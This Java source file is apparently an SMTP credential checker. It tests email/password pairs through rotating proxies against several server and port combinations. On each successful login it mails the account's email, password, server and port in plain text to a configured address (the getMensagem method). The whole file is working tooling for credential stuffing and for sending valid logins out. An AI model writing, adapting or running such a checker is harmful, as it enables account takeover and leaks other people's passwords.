/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package br.com.jerrycoder.core;

import br.com.jerrycoder.util.email.MXRecordChecker;
import br.com.jerrycoder.model.SettingsTemplate;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Store;
import br.com.jerrycoder.model.DadosLogin;
import br.com.jerrycoder.model.Proxy;
import br.com.jerrycoder.model.ResponseConection;
import br.com.jerrycoder.util.email.EmailValidator;
import javax.mail.Message;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 *
 * @author jerry
 */
public class ConectionSMTP {

    ResponseConection response;

    public ConectionSMTP() {

        response = new ResponseConection();
    }

    public ResponseConection conectar(DadosLogin dadosLogin, SettingsTemplate settingsTemplate) {

        Proxy proxy = new Proxy();
        proxy.setUseProxy(settingsTemplate.getUseProxy());
        if (settingsTemplate.getUseProxy()) {

            String proxyStr = settingsTemplate.getValueProxyList();

            String[] array = proxyStr.split(":");
            proxy.setUseProxy(true);

            if (array.length == 2) {
                proxy.setHost(array[0]);
                proxy.setPort(array[1]);
                proxy.setAuth(false);
            }

            if (array.length == 4) {
                proxy.setHost(array[0]);
                proxy.setPort(array[1]);
                proxy.setUser(array[2]);
                proxy.setPass(array[3]);
                proxy.setAuth(true);
            }

        }

        if (settingsTemplate.getVerifyFormattEmail()) {
            if (!EmailValidator.validateEmail(dadosLogin.getUsername())) {
                response.setCodResponse(1);
                response.setStatusResponse("Formato email inválido");
                return response;
            }

        }

        if (settingsTemplate.getVerifyMx()) {
            if (!MXRecordChecker.isValidMX(dadosLogin.getUsername())) {

                response.setCodResponse(1);
                response.setStatusResponse("MX Inválido");
                return response;
            }
        }

        //Realiza testes com as portas e servers selecionados no front-end
        //TESTE 1
        if (settingsTemplate.getPortEmail1() && settingsTemplate.getServerEmail1()) {
            System.out.println(settingsTemplate.getPortEmail1() + ":" + settingsTemplate.getServerEmail1());
            System.out.println(settingsTemplate.getServerText1() + ":" + settingsTemplate.getPortText1());
            dadosLogin.setServer(settingsTemplate.getServerText1());
            dadosLogin.setPort(settingsTemplate.getPortText1());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 2
        if (settingsTemplate.getPortEmail2() && settingsTemplate.getServerEmail1()) {
            dadosLogin.setServer(settingsTemplate.getServerText1());
            dadosLogin.setPort(settingsTemplate.getPortText2());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 3
        if (settingsTemplate.getPortEmail3() && settingsTemplate.getServerEmail1()) {
            dadosLogin.setServer(settingsTemplate.getServerText1());
            dadosLogin.setPort(settingsTemplate.getPortText3());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 4
        if (settingsTemplate.getPortEmail1() && settingsTemplate.getServerEmail2()) {
            dadosLogin.setServer(settingsTemplate.getServerText2());
            dadosLogin.setPort(settingsTemplate.getPortText1());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 5
        if (settingsTemplate.getPortEmail2() && settingsTemplate.getServerEmail2()) {
            dadosLogin.setServer(settingsTemplate.getServerText2());
            dadosLogin.setPort(settingsTemplate.getPortText2());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 6
        if (settingsTemplate.getPortEmail3() && settingsTemplate.getServerEmail2()) {
            dadosLogin.setServer(settingsTemplate.getServerText2());
            dadosLogin.setPort(settingsTemplate.getPortText3());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 7
        if (settingsTemplate.getPortEmail1() && settingsTemplate.getServerEmail3()) {
            dadosLogin.setServer(settingsTemplate.getServerText3());
            dadosLogin.setPort(settingsTemplate.getPortText1());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 8
        if (settingsTemplate.getPortEmail2() && settingsTemplate.getServerEmail3()) {
            dadosLogin.setServer(settingsTemplate.getServerText3());
            dadosLogin.setPort(settingsTemplate.getPortText2());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 9
        if (settingsTemplate.getPortEmail3() && settingsTemplate.getServerEmail3()) {
            dadosLogin.setServer(settingsTemplate.getServerText3());
            dadosLogin.setPort(settingsTemplate.getPortText3());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 10
        if (settingsTemplate.getPortEmail1() && settingsTemplate.getServerEmail4()) {
            dadosLogin.setServer(settingsTemplate.getServerText4());
            dadosLogin.setPort(settingsTemplate.getPortText1());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 12
        if (settingsTemplate.getPortEmail2() && settingsTemplate.getServerEmail4()) {
            dadosLogin.setServer(settingsTemplate.getServerText4());
            dadosLogin.setPort(settingsTemplate.getPortText2());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }

        //TESTE 13
        if (settingsTemplate.getPortEmail3() && settingsTemplate.getServerEmail4()) {
            dadosLogin.setServer(settingsTemplate.getServerText4());
            dadosLogin.setPort(settingsTemplate.getPortText3());
            login(dadosLogin, proxy, settingsTemplate.getSendMail());
            if (response.getCodResponse() == 0 || response.getCodResponse() == 2 || response.getStatusResponse().equals("AuthenticationFailedException")) {
                return response;
            }
        }
        return response;
    }

    private void login(DadosLogin dadosLogin, Proxy proxy, String sendTo) {

        try {
            MailSession mailSession = new MailSession(dadosLogin, proxy);
            Session session = mailSession.getSession();
            Transport transport = session.getTransport(dadosLogin.getProtocoloType());
            transport.connect();

            if (transport.isConnected()) {
                MimeMessage message = getMensagem(session, dadosLogin.getUsername(), dadosLogin.getPass(), dadosLogin.getServer(), dadosLogin.getPort(), sendTo);
                transport.sendMessage(message, message.getAllRecipients());

                response.setCodResponse(0);
                response.setStatusResponse("Conectado");
            } else {
                response.setCodResponse(3);
                response.setStatusResponse("Não Conectado");
            }
        } catch (javax.mail.AuthenticationFailedException ex) {
            response.setCodResponse(1);
            response.setStatusResponse("AuthenticationFailedException");
        } catch (NoSuchProviderException ex) {
            response.setCodResponse(3);
            response.setStatusResponse("NoSuchProviderException");
        } catch (javax.mail.SendFailedException ex) {

            if (ex.toString().contains("Invalid Addresses")) {
                response.setCodResponse(3);
                response.setStatusResponse("Invalid Addresses");
            } else {
                response.setCodResponse(3);
                response.setStatusResponse("NoSuchProviderException");
            }

        } catch (com.sun.mail.util.MailConnectException ex) {

            if (ex.toString().contains("Proxy Authentication Required")) {
                response.setCodResponse(2);
                response.setStatusResponse("Proxy Authentication Required");
            } else if (ex.toString().contains("502 Proxy Error")) {
                response.setCodResponse(3);
                response.setStatusResponse("502 Proxy Error");
            } else {
                ex.printStackTrace();
                response.setCodResponse(3);
                response.setStatusResponse("MailConnectException");
            }

        } catch (MessagingException ex) {

            if (ex.toString().contains("SocketTimeoutException")) {
                response.setCodResponse(2);
                response.setStatusResponse("SocketTimeoutException");
            } else if (ex.toString().contains("403 Forbidden")) {
                response.setCodResponse(2);
                response.setStatusResponse("403 Forbidden");
            } else if (ex.toString().contains("Internal Server Error")) {
                response.setCodResponse(2);
                response.setStatusResponse("Internal Server Error");
            } else if (ex.toString().contains("BAD AUTHENTICATE")) {
                response.setCodResponse(3);
                response.setStatusResponse("BAD AUTHENTICATE");
            } else if (ex.toString().contains("Connection dropped by server")) {
                response.setCodResponse(3);
                response.setStatusResponse("Connection dropped by server");
            }else if (ex.toString().contains("Could not convert socket to TLS")) {
                response.setCodResponse(3);
                response.setStatusResponse("Could not convert socket to TLS");
            } else {
                ex.printStackTrace();
                response.setCodResponse(3);
                response.setStatusResponse("MessagingException");
            }

        }

    }

    private MimeMessage getMensagem(Session session, String user, String pass, String server, String port, String to) throws MessagingException {

        MimeMessage message = new MimeMessage(session);

        message.addHeader("Content-type", "text/HTML; charset=UTF-8");
        message.addHeader("format", "flowed");
        message.addHeader("Content-Transfer-Encoding", "64bit");
        message.setReplyTo(InternetAddress.parse("no_reply@" + server, false));
        message.setFrom(new InternetAddress(user));
        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
        message.setSubject("Java SMTP - " + System.currentTimeMillis(), "UTF-8");
        message.setText("Email: " + user
                + " | Pass: " + pass
                + " | Server: " + server
                + " | Port: " + port
                + " | Currente Date: " + System.currentTimeMillis(), "UTF-8");

        return message;

    }

}
